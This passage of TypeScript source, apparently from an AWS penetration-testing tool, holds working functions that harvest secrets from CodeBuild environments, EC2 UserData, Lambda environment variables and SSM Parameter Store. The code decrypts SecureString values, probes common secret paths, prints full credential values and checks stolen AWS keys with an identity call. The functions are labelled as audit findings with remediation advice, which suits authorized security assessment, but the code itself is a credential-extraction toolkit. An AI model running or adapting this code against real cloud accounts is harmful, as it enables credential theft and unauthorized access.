              output.push(`    [!] PLAINTEXT env: ${ev.name} = [SECRET FOUND — ${String(ev.value).length} chars]`)
              findings.push({
                checkId: "AWS-CICD-003",
                provider: "aws",
                severity: "critical",
                status: "EXTRACTED",
                resource: `codebuild:${name}:env:${ev.name}`,
                title: `Plaintext secret in CodeBuild env: ${ev.name}`,
                details: `Project ${name}: ${ev.name} [SECRET FOUND — ${String(ev.value).length} chars]`,
                remediation: "Use SECRETS_MANAGER or PARAMETER_STORE type instead of PLAINTEXT",
              })
            } else if (ev.type === "PARAMETER_STORE" || ev.type === "SECRETS_MANAGER") {
              output.push(`    Env: ${ev.name} (${ev.type}: ${ev.value})`)
              findings.push({
                checkId: "AWS-CICD-004",
                provider: "aws",
                severity: "medium",
                status: "REFERENCE",
                resource: `codebuild:${name}:env:${ev.name}`,
                title: `CodeBuild references ${ev.type}: ${ev.name}`,
                details: `Reference: ${ev.value} — extract via secrets_dump or ssm parameter store`,
                remediation: "Ensure least-privilege access to referenced secret",
              })
            } else if (isSecret) {
              output.push(`    Env: ${ev.name} = [SECRET FOUND — ${String(ev.value).length} chars] (${ev.type})`)
            }
          }

          if (d.env?.privilegedMode) {
            output.push(`    [!] Privileged mode enabled — Docker-in-Docker, host access`)
            findings.push({
              checkId: "AWS-CICD-005",
              provider: "aws",
              severity: "high",
              status: "ENABLED",
              resource: `codebuild:${name}`,
              title: `CodeBuild privileged mode: ${name}`,
              details: "Container runs with elevated privileges — can access Docker socket, mount host filesystem",
              remediation: "Disable privileged mode unless required for Docker builds",
            })
          }
        }
      }
    }
  }

  const connections = await aws(
    [
      "codestar-connections",
      "list-connections",
      "--query",
      "Connections[].[ConnectionName,ConnectionArn,ProviderType,ConnectionStatus]",
    ],
    profile,
    region,
    timeout,
  )
  if (connections.exitCode === 0) {
    const conns = tryJson(connections.stdout) || []
    if (conns.length) {
      output.push(`\n[+] CodeStar Connections: ${conns.length}`)
      for (const conn of conns) {
        output.push(`  ${conn[0]}  Provider: ${conn[2]}  Status: ${conn[3]}`)
        findings.push({
          checkId: "AWS-CICD-006",
          provider: "aws",
          severity: "medium",
          status: "FOUND",
          resource: `codestar:connection:${conn[0]}`,
          title: `CodeStar connection to ${conn[2]}: ${conn[0]}`,
          details: `${conn[3]} connection — may provide access to external Git repositories`,
          remediation: "Review connection permissions and linked repositories",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function ec2UserData(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] EC2 Instance UserData Extraction (Pacu ec2__download_userdata)\n"]

  const secretPattern =
    /(?:password|passwd|secret|api.?key|token|private.?key|connection.?string|db.?(?:host|pass|user|url)|redis|mongo|mysql|postgres|jdbc|aws_access|aws_secret|bearer|authorization)/i

  const instances = await aws(
    ["ec2", "describe-instances", "--query", "Reservations[].Instances[].[InstanceId,State.Name,Tags[?Key=='Name'].Value|[0],InstanceType,LaunchTime]"],
    profile,
    region,
    timeout,
  )
  if (instances.exitCode !== 0) {
    return { output: `[-] Cannot list instances: ${instances.stderr.trim()}`, findings }
  }

  const list = (tryJson(instances.stdout) || []) as Array<unknown[]>
  output.push(`[+] Instances: ${list.length} total\n`)

  let harvested = 0
  let secretsFound = 0

  for (const inst of list) {
    const id = inst[0] as string
    const state = inst[1] as string
    const name = (inst[2] as string) || "unnamed"

    const ud = await aws(
      ["ec2", "describe-instance-attribute", "--instance-id", id, "--attribute", "userData", "--query", "UserData.Value", "--output", "text"],
      profile,
      region,
      timeout,
    )
    if (ud.exitCode !== 0 || !ud.stdout.trim() || ud.stdout.trim() === "None") continue

    harvested++
    const raw = ud.stdout.trim()
    let decoded: string
    try {
      decoded = Buffer.from(raw, "base64").toString("utf-8")
    } catch {
      decoded = raw
    }

    const lines = decoded.split("\n")
    const preview = lines.slice(0, 3).join(" ").slice(0, 120)
    output.push(`[+] ${id} (${name}, ${state}) — UserData ${decoded.length} bytes`)
    output.push(`    Preview: ${preview}${lines.length > 3 ? "..." : ""}`)

    const assignPattern = /^(?:export\s+)?(\w*(?:password|passwd|secret|api.?key|token|private.?key|connection.?string|db.?(?:host|pass|user|url)|redis|mongo|mysql|postgres|jdbc|aws_access|aws_secret|bearer|authorization)\w*)\s*[=:]\s*['"]?(.+?)['"]?\s*$/i
    const yamlPattern = /^\s*(password|secret|token|key|credential|auth|private_key|api_key|db_password|master_password)\s*:\s*['"]?(.+?)['"]?\s*$/i
    const dockerEnvPattern = /^\s*-e\s+(\w*(?:password|secret|key|token|auth)\w*)=(.+)\s*$/i
    const awsProfilePattern = /^\s*(aws_access_key_id|aws_secret_access_key|aws_session_token)\s*=\s*(.+)\s*$/i

    const extracted: Array<{ line: number; key: string; value: string }> = []
    const matchedLines: string[] = []

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i].trim()
      if (line.startsWith("#") || line.startsWith("//")) continue

      let m: RegExpMatchArray | null = null
      m = line.match(assignPattern) || line.match(yamlPattern) || line.match(dockerEnvPattern) || line.match(awsProfilePattern)

      if (m) {
        extracted.push({ line: i + 1, key: m[1], value: m[2] })
        matchedLines.push(`    L${i + 1}: ${m[1]} = ${m[2]}`)
      } else if (secretPattern.test(line) && /[=:]/.test(line)) {
        matchedLines.push(`    L${i + 1}: ${line}`)
      }
    }

    if (matchedLines.length > 0) {
      secretsFound += matchedLines.length
      if (extracted.length > 0) {
        output.push(`    [*] Extracted Credentials (${extracted.length}):`)
        for (const e of extracted.slice(0, 20)) output.push(`    L${e.line}: ${e.key} = ${e.value}`)
        if (extracted.length > 20) output.push(`    ... and ${extracted.length - 20} more`)
      }
      if (matchedLines.length > extracted.length) {
        output.push(`    [*] Additional secret lines (${matchedLines.length - extracted.length}):`)
        for (const m of matchedLines.filter((_, i) => i >= extracted.length).slice(0, 10)) output.push(m)
      }
      const akEntry = extracted.find((e) => /aws_access_key_id/i.test(e.key))
      const skEntry = extracted.find((e) => /aws_secret_access_key/i.test(e.key))
      if (akEntry && skEntry) {
        const vr = await validateAwsCredential(akEntry.value, skEntry.value)
        if (vr.valid) {
          output.push(`    [!!] VALIDATED AWS creds — identity: ${vr.identity}, account: ${vr.account}`)
          findings.push({ checkId: "AWS-CRED-USERDATA-003", provider: "aws", severity: "critical", status: "VALIDATED", resource: `ec2://${id}`, title: `Live AWS credentials in UserData: ${id}`, details: `Validated: ${vr.identity} (account ${vr.account})`, remediation: "Rotate credentials immediately, use instance profile instead of static keys in UserData" })
        } else {
          output.push(`    [!] AWS credential validation failed: ${vr.error}`)
        }
      }

      findings.push({
        checkId: "AWS-CRED-USERDATA-001",
        provider: "aws",
        severity: "high",
        status: "EXTRACTED",
        resource: `ec2://${id}`,
        title: `Secrets in UserData: ${id} (${name})`,
        details: extracted.length > 0
          ? `${extracted.length} credential(s) extracted: ${extracted.slice(0, 5).map((e) => `${e.key}=${e.value}`).join("; ")}${extracted.length > 5 ? ` +${extracted.length - 5} more` : ""}`
          : `${matchedLines.length} secret pattern(s) in ${decoded.length}-byte UserData`,
        remediation: "Move secrets to Secrets Manager/SSM Parameter Store, reference via cloud-init dynamic lookup",
      })
    } else {
      findings.push({
        checkId: "AWS-CRED-USERDATA-002",
        provider: "aws",
        severity: "medium",
        status: "FOUND",
        resource: `ec2://${id}`,
        title: `UserData present: ${id} (${name})`,
        details: `${decoded.length}-byte UserData — may contain sensitive bootstrap config (${lines.length} lines)`,
        remediation: "Review UserData for hardcoded credentials or internal endpoints",
      })
    }
  }

  output.push(`\n[*] Summary: ${harvested} instances with UserData, ${secretsFound} secret patterns found`)
  return { output: output.join("\n"), findings }
}

export async function lambdaEnvHarvest(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] Lambda Environment Variable Harvest (CloudFox env-vars)\n"]

  const secretPattern =
    /(?:PASSWORD|PASSWD|SECRET|API.?KEY|TOKEN|PRIVATE|AUTH|JWT|DB_|REDIS_|MONGO_|MYSQL_|POSTGRES_|DATABASE_|CONNECTION|CREDENTIAL|BEARER|MASTER_KEY|ENCRYPTION)/i

  const funcs = await aws(
    ["lambda", "list-functions", "--query", "Functions[].[FunctionName,Runtime,FunctionArn]"],
    profile,
    region,
    timeout,
  )
  if (funcs.exitCode !== 0) {
    return { output: `[-] Cannot list functions: ${funcs.stderr.trim()}`, findings }
  }

  const fl = (tryJson(funcs.stdout) || []) as Array<unknown[]>
  output.push(`[+] Lambda functions: ${fl.length}\n`)

  let totalEnvVars = 0
  let secretVars = 0

  for (const fn of fl) {
    const name = fn[0] as string
    const runtime = fn[1] as string

    const config = await aws(
      ["lambda", "get-function-configuration", "--function-name", name, "--query", "{env:Environment.Variables,role:Role,vpc:VpcConfig.VpcId,layers:Layers[].Arn}"],
      profile,
      region,
      timeout,
    )
    if (config.exitCode !== 0) continue

    const cfg = tryJson(config.stdout) as Record<string, unknown> | null
    if (!cfg) continue
    const env = cfg.env as Record<string, string> | null
    if (!env || Object.keys(env).length === 0) continue

    const keys = Object.keys(env)
    totalEnvVars += keys.length
    const secrets = keys.filter((k) => secretPattern.test(k))

    if (secrets.length > 0) {
      secretVars += secrets.length
      output.push(`[!] ${name} (${runtime}) — ${keys.length} env vars, ${secrets.length} secrets:`)
      const harvested: Record<string, string> = {}
      for (const s of secrets) {
        const val = env[s]
        harvested[s] = val
        output.push(`    ${s} = ${val}`)
      }
      const akid = keys.find((k) => /^AWS_ACCESS_KEY_ID$/i.test(k) || /^AKIA|^ASIA/.test(env[k] || ""))
      if (akid) {
        const sak = keys.find((k) => /SECRET|AWS_SECRET/i.test(k))
        if (sak) {
          output.push(`    [!!] AWS credential pair: ${akid}=${env[akid]}  ${sak}=${env[sak]}`)
          const sess = keys.find((k) => /SESSION_TOKEN|SECURITY_TOKEN/i.test(k))
          if (sess) output.push(`    [!!] Session token: ${sess}=${env[sess]}`)
          const vr = await validateAwsCredential(env[akid] || "", env[sak] || "", sess ? (env[sess] || undefined) : undefined)
          if (vr.valid) {
            output.push(`    [!!] VALIDATED — identity: ${vr.identity}, account: ${vr.account}`)
            findings.push({ checkId: "AWS-CRED-LAMBDA-ENV-002", provider: "aws", severity: "critical", status: "VALIDATED", resource: `lambda://${name}`, title: `Live AWS credentials in Lambda env: ${name}`, details: `Validated: ${vr.identity} (account ${vr.account})`, remediation: "Rotate credentials immediately, use IAM execution role instead of static keys" })
          } else {
            output.push(`    [!] Credential validation failed: ${vr.error}`)
          }
        }
      }
      findings.push({
        checkId: "AWS-CRED-LAMBDA-ENV-001",
        provider: "aws",
        severity: "high",
        status: "EXTRACTED",
        resource: `lambda://${name}`,
        title: `Secrets in Lambda env: ${name}`,
        details: `${secrets.length} secret(s): ${Object.entries(harvested).map(([k, v]) => `${k}=${v}`).join("; ")}`,
        remediation: "Use Secrets Manager with Lambda extension, or SSM Parameter Store, instead of plaintext env vars",
      })
    } else if (keys.length > 0) {
      output.push(`[+] ${name} (${runtime}) — ${keys.length} env vars: ${keys.slice(0, 8).join(", ")}${keys.length > 8 ? "..." : ""}`)
    }
  }

  output.push(`\n[*] Summary: ${totalEnvVars} total env vars across ${fl.length} functions, ${secretVars} secret patterns`)
  return { output: output.join("\n"), findings }
}

export async function ssmParameterMine(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] SSM Parameter Store Deep Mining\n"]

  const secretPattern =
    /(?:password|passwd|secret|api.?key|token|private|auth|jwt|credential|connection|master|encryption|db|redis|mongo|mysql|postgres)/i

  const params = await aws(
    ["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type,Description,LastModifiedDate]"],
    profile,
    region,
    timeout,
  )
  if (params.exitCode !== 0) {
    return { output: `[-] Cannot list parameters: ${params.stderr.trim()}`, findings }
  }

  const pl = (tryJson(params.stdout) || []) as Array<unknown[]>
  const secureCount = pl.filter((p) => p[1] === "SecureString").length
  const stringCount = pl.filter((p) => p[1] === "String").length
  const stringListCount = pl.filter((p) => p[1] === "StringList").length
  output.push(`[+] Parameters: ${pl.length} total — ${secureCount} SecureString, ${stringCount} String, ${stringListCount} StringList\n`)

  let secretsFound = 0
  let decryptFailed = 0

  for (const p of pl) {
    const name = p[0] as string
    const type = p[1] as string
    const desc = (p[2] as string) || ""

    if (type === "SecureString") {
      const val = await aws(
        ["ssm", "get-parameter", "--name", name, "--with-decryption", "--query", "Parameter.Value", "--output", "text"],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0 && val.stdout.trim()) {
        secretsFound++
        const v = val.stdout.trim()
        output.push(`[!] ${name} (SecureString) = ${v}`)
        const parsed = tryJson(v) as Record<string, unknown> | null
        if (parsed && typeof parsed === "object") {
          const sensitiveKeys = Object.keys(parsed).filter((k) => secretPattern.test(k))
          if (sensitiveKeys.length > 0) {
            output.push(`    [*] JSON credential fields:`)
            for (const sk of sensitiveKeys) output.push(`      ${sk} = ${String(parsed[sk])}`)
          }
        }
        const connMatch = v.match(/:\/\/([^:]+):([^@]+)@/)
        if (connMatch) output.push(`    [*] Connection string creds: user=${connMatch[1]} pass=${connMatch[2]}`)
        findings.push({
          checkId: "AWS-CRED-SSM-001",
          provider: "aws",
          severity: "high",
          status: "EXTRACTED",
          resource: `ssm://${name}`,
          title: `SecureString decrypted: ${name}`,
          details: `Value: ${v}${desc ? ` — "${desc}"` : ""}`,
          remediation: "Restrict ssm:GetParameter with kms:Decrypt to minimum required principals",
        })
      } else {
        decryptFailed++
        output.push(`[-] ${name} (SecureString) — decrypt denied (KMS access required)`)
      }
      continue
    }

    const val = await aws(
      ["ssm", "get-parameter", "--name", name, "--query", "Parameter.Value", "--output", "text"],
      profile,
      region,
      timeout,
    )
    if (val.exitCode !== 0) continue

    const v = val.stdout.trim()
    if (secretPattern.test(name) || secretPattern.test(v)) {
      secretsFound++
      output.push(`[!] ${name} (${type}) = ${v}`)
      const parsed = tryJson(v) as Record<string, unknown> | null
      if (parsed && typeof parsed === "object") {
        const sensitiveKeys = Object.keys(parsed).filter((k) => secretPattern.test(k))
        if (sensitiveKeys.length > 0) {
          output.push(`    [*] JSON credential fields:`)
          for (const sk of sensitiveKeys) output.push(`      ${sk} = ${String(parsed[sk])}`)
        }
      }
      findings.push({
        checkId: "AWS-CRED-SSM-002",
        provider: "aws",
        severity: "high",
        status: "FOUND",
        resource: `ssm://${name}`,
        title: `Secret in plaintext parameter: ${name}`,
        details: `Value: ${v} — stored as ${type} (not SecureString)`,
        remediation: "Migrate to SecureString type with KMS encryption",
      })
    } else {
      output.push(`[+] ${name} (${type}) — ${v.length} chars`)
    }
  }

  const commonPaths = ["/prod/", "/production/", "/database/", "/api/", "/credentials/", "/secrets/", "/config/"]
  const checkedPaths = new Set(pl.map((p) => p[0] as string))
  const discoveredPaths: string[] = []

  for (const prefix of commonPaths) {
    const pathParams = await aws(
      ["ssm", "get-parameters-by-path", "--path", prefix, "--recursive", "--query", "Parameters[].[Name,Type,Value]"],
      profile,
      region,
      timeout,
    )
    if (pathParams.exitCode !== 0) continue
    const pathList = (tryJson(pathParams.stdout) || []) as Array<unknown[]>
    for (const pp of pathList) {
      const ppName = pp[0] as string
      if (checkedPaths.has(ppName)) continue
      checkedPaths.add(ppName)
      discoveredPaths.push(ppName)
      const ppType = pp[1] as string
      const ppVal = pp[2] as string
      if (ppVal && (secretPattern.test(ppName) || secretPattern.test(ppVal))) {
        secretsFound++
        output.push(`[!] ${ppName} (${ppType}, path discovery) = ${ppVal}`)
        findings.push({
          checkId: "AWS-CRED-SSM-003",
          provider: "aws",
          severity: "high",
          status: "FOUND",
          resource: `ssm://${ppName}`,
          title: `Secret found via path enumeration: ${ppName}`,
          details: `Value: ${ppVal} — discovered under ${prefix}`,
          remediation: "Restrict ssm:GetParametersByPath, use SecureString for sensitive values",
        })
      }
    }
  }

  if (discoveredPaths.length > 0) {
    output.push(`\n[+] Path discovery found ${discoveredPaths.length} additional parameter(s) not in top-level listing`)
  }

  output.push(`\n[*] Summary: ${secretsFound} secrets extracted, ${decryptFailed} decrypt denied, ${pl.length + discoveredPaths.length} total parameters`)
  return { output: output.join("\n"), findings }
}

export async function validateAwsCredential(
  accessKeyId: string,
  secretAccessKey: string,
  sessionToken?: string,
): Promise<{ valid: boolean; identity: string | null; account: string | null; error: string | null }> {
  const env: Record<string, string> = {
    ...process.env as Record<string, string>,
    AWS_ACCESS_KEY_ID: accessKeyId,
    AWS_SECRET_ACCESS_KEY: secretAccessKey,
  }
  if (sessionToken) env.AWS_SESSION_TOKEN = sessionToken
  delete env.AWS_PROFILE
  delete env.AWS_DEFAULT_PROFILE

  const proc = Bun.spawn(["aws", "sts", "get-caller-identity", "--output", "json"], {
    env,
    stdout: "pipe",
    stderr: "pipe",
  })
  const stdout = await new Response(proc.stdout).text()
  const stderr = await new Response(proc.stderr).text()
  await proc.exited

  if (proc.exitCode !== 0) {
    return { valid: false, identity: null, account: null, error: stderr.trim() }
  }

  const result = JSON.parse(stdout) as Record<string, string>
  return {
    valid: true,
    identity: result.Arn || null,
    account: result.Account || null,
    error: null,
  }
}
